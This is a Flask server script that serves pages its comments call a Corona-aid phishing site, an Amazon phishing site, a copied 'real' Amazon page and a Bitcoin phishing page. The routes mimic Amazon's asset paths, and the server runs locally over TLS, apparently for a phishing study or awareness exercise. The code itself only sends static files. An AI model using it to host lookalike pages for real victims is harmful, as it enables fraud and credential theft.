import os

import flask

# set the project root directory as the static folder, you can set others.
app = flask.Flask(__name__, static_url_path="")
app.config.from_pyfile("config.py", silent=True)
app._static_folder = ""

t_path = os.path.abspath(os.path.dirname(__file__))
html_folder_path = os.path.join(t_path, "html")


# Corona phishing site


@app.route("/neuerAntrag")
def corona_ger():
    file_path = os.path.join(html_folder_path, "ger/corona.html")
    return flask.send_file(file_path)


@app.route("/register")
def corona_eng():
    file_path = os.path.join(html_folder_path, "eng/corona.html")
    return flask.send_file(file_path)


# Corona Phishing Dependencies


@app.route("/corona_dependencies/favicon.ico")
def corona_favicon():
    file_path = os.path.join(html_folder_path,
                             "eng/corona_dependencies/favicon.ico")
    return flask.send_file(file_path)


@app.route("/corona_dependencies/login.css")
def corona_login_css():
    file_path = os.path.join(html_folder_path,
                             "ger/corona_dependencies/login.css")
    return flask.send_file(file_path)


@app.route("/corona_dependencies/patternfly.css")
def corona_patternfly_css():
    file_path = os.path.join(html_folder_path,
                             "ger/corona_dependencies/patternfly.css")
    return flask.send_file(file_path)


@app.route("/corona_dependencies/patternfly-additions.css")
def corona_patternfly_additions_css():
    file_path = os.path.join(html_folder_path,
                             ("ger/corona_dependencies/"
                              "patternfly-additions.css"))
    return flask.send_file(file_path)


@app.route("/corona_dependencies/zocial.css")
def corona_zocial_css():
    file_path = os.path.join(html_folder_path,
                             "ger/corona_dependencies/zocial.css")
    return flask.send_file(file_path)


@app.route("/corona_dependencies/Logo_Coronahilfe.png")
def corona_logo_coronahilfe():
    file_path = os.path.join(html_folder_path,
                             "ger/corona_dependencies/Logo_Coronahilfe.png")
    return flask.send_file(file_path)


@app.route("/corona_dependencies/logo.png")
def corona_logo():
    file_path = os.path.join(html_folder_path,
                             "ger/corona_dependencies/logo.png")
    return flask.send_file(file_path)


@app.route("/fonts/OpenSans-Bold-webfont.ttf")
def corona_opensans_font_bold():
    file_path = os.path.join(html_folder_path,
                             ("ger/corona_dependencies/"
                              "OpenSans-Bold-webfont.ttf"))
    return flask.send_file(file_path)


@app.route("/fonts/OpenSans-Light-webfont.ttf")
def corona_opensans_font_light():
    file_path = os.path.join(html_folder_path,
                             ("ger/corona_dependencies/"
                              "OpenSans-Light-webfont.ttf"))
    return flask.send_file(file_path)


@app.route("/fonts/OpenSans-Regular-webfont.ttf")
def corona_opensans_font_regulard():
    file_path = os.path.join(html_folder_path,
                             ("ger/corona_dependencies/"
                              "OpenSans-Regular-webfont.ttf"))
    return flask.send_file(file_path)


@app.route("/fonts/OpenSans-Semibold-webfont.ttf")
def corona_opensans_font_semibold():
    file_path = os.path.join(html_folder_path,
                             ("ger/corona_dependencies/"
                              "OpenSans-SemiBold-webfont.ttf"))
    return flask.send_file(file_path)


# "real" Amazon site


@app.route("/gp/r_de.html")
def real_amazon_ger():
    file_path = os.path.join(html_folder_path, "ger/realamazon.html")
    return flask.send_file(file_path)


@app.route("/gp/r.html")
def real_amazon_eng():
    file_path = os.path.join(html_folder_path, "eng/realamazon.html")
    return flask.send_file(file_path)


@app.route("/images/I/51uXLXaz3BL.jpg")
def real_amazon_cup_image():
    file_path = os.path.join(html_folder_path, "eng/amazoncup.jpg")
    return flask.send_file(file_path)


# Dependencies for "real" Amazon


@app.route("/gp/delivery.png")
def real_amazon_delivery_image():
    file_path = os.path.join(html_folder_path, "eng/delivery.png")
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/realamazon_1.css")
def real_amazon_css_1():
    file_path = os.path.join(html_folder_path,
                             "eng/realamazon_dependencies/realamazon_1.css")
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/realamazon_2.css")
def real_amazon_css_2():
    file_path = os.path.join(html_folder_path,
                             "eng/realamazon_dependencies/realamazon_2.css")
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/realamazon_3.css")
def real_amazon_css_3():
    file_path = os.path.join(html_folder_path,
                             "eng/realamazon_dependencies/realamazon_3.css")
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/realamazon_4.css")
def real_amazon_css_4():
    file_path = os.path.join(html_folder_path,
                             "eng/realamazon_dependencies/realamazon_4.css")
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/41fr+NM7MEL.css")
def real_amazon_css_5():
    file_path = os.path.join(html_folder_path,
                             "eng/realamazon_dependencies/41fr+NM7MEL.css")
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/javascript_1.js")
def real_amazon_js_0():
    file_path = os.path.join(html_folder_path,
                             "eng/realamazon_dependencies/javascript_1.js")
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/61-6nKPKyWL.js")
def real_amazon_js_1():
    file_path = os.path.join(html_folder_path,
                             "eng/realamazon_dependencies/61-6nKPKyWL.js")
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/realamazon_2.js")
def real_amazon_js_2():
    file_path = os.path.join(html_folder_path,
                             "eng/realamazon_dependencies/realamazon_2.js")
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/51LnqtJRjTL.js")
def real_amazon_js_3():
    file_path = os.path.join(html_folder_path,
                             "eng/realamazon_dependencies/51LnqtJRjTL.js")
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/01rGP6HIADL.js")
def real_amazon_js_4():
    file_path = os.path.join(html_folder_path,
                             "eng/realamazon_dependencies/01rGP6HIADL.js")
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/01fjWJl6VXL._RC 41z5VZesFyL.js_.js")
def real_amazon_js_5():
    file_path = os.path.join(html_folder_path,
                             ("eng/realamazon_dependencies/"
                              "01fjWJl6VXL._RC 41z5VZesFyL.js_.js"))
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/31j9oPYRZNL.js")
def real_amazon_js_6():
    file_path = os.path.join(html_folder_path,
                             "eng/realamazon_dependencies/31j9oPYRZNL.js")
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/91OwyTNspBL.js")
def real_amazon_js_7():
    file_path = os.path.join(html_folder_path,
                             "eng/realamazon_dependencies/91OwyTNspBL.js")
    return flask.send_file(file_path)


@app.route(("/gp/realamazon_dependencies/"
           "nav-sprite-global-1x-hm-dsk-reorg._CB405937547_.png"))
def real_amazon_png_1():
    file_path = os.path.join(html_folder_path,
                             ("eng/realamazon_dependencies/"
                              "nav-sprite-global-1x-hm-dsk-"
                              "reorg._CB405937547_.png"))
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/timeline_sprite_1x._CB485945973_.png")
def real_amazon_png_2():
    file_path = os.path.join(html_folder_path,
                             ("eng/realamazon_dependencies/"
                              "timeline_sprite_1x._CB485945973_.png"))
    return flask.send_file(file_path)


@app.route("/gp/realamazon_dependencies/snake._CB485935611_.gif")
def real_amazon_gif_1():
    file_path = os.path.join(html_folder_path,
                             ("eng/realamazon_dependencies/"
                              "snake._CB485935611_.gif"))
    return flask.send_file(file_path)


@app.route(("/gp/realamazon_dependencies/"
            "YjgwNDI1YjYt-ZmEzYmNkNmMt-w1500._CB661635189_.jpg"))
def real_amazon_jpg_1():
    file_path = os.path.join(html_folder_path,
                             ("eng/realamazon_dependencies/"
                              "YjgwNDI1YjYt-ZmEzYmNkNmMt-w1500."
                              "_CB661635189_.jpg"))
    return flask.send_file(file_path)


# workaround


@app.route("/favicon.ico")
def real_amazon_favicon():
    file_path = os.path.join(html_folder_path,
                             "eng/realamazon_dependencies/favicon.ico")
    return flask.send_file(file_path)


# Amazon phishing site


@app.route("/support_de")
def amazon_ger():
    file_path = os.path.join(html_folder_path, "ger/amazon.html")
    return flask.send_file(file_path)


@app.route(("/61A6IErPNXL._RC 11Fd9tJOdtL.css,11tfezETfFL.css,"
           "31Q3id-QR0L.css,31U9HrBLKmL.css_.css"))
def amazon_dependencie_1():
    file_path = os.path.join(html_folder_path,
                             ("ger/amazon_dependencies/61A6IErPNXL._RC "
                              "11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-"
                              "QR0L.css,31U9HrBLKmL.css_.css"))
    return flask.send_file(file_path)


@app.route("/01SdjaY0ZsL._RC 419sIPk+mYL.css,41REwEK74kL.css_.css")
def amazon_dependencie_2():
    file_path = os.path.join(html_folder_path,
                             ("ger/amazon_dependencies/01SdjaY0ZsL."
                              "_RC 419sIPk+mYL.css,41REwEK74kL.css_.css"))
    return flask.send_file(file_path)


@app.route("/11G4j12sgkL.css")
def amazon_dependencie_3():
    file_path = os.path.join(html_folder_path,
                             "ger/amazon_dependencies/11G4j12sgkL.css")
    return flask.send_file(file_path)


@app.route("/support")
def amazon_eng():
    file_path = os.path.join(html_folder_path, "eng/amazon.html")
    return flask.send_file(file_path)


# Bitcoin phishing site (currently not included)


@app.route("/bitcoin")
def bitcoin():
    file_path = os.path.join(html_folder_path, "bitcoin.html")
    return flask.send_file(file_path)


@app.route("/bitcoin/bitcoin.png")
def bitcoin_image():
    file_path = os.path.join(html_folder_path, "bitcoin.png")
    return flask.send_file(file_path)


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=443,
            ssl_context=(r"server.crt", r"server.key"))
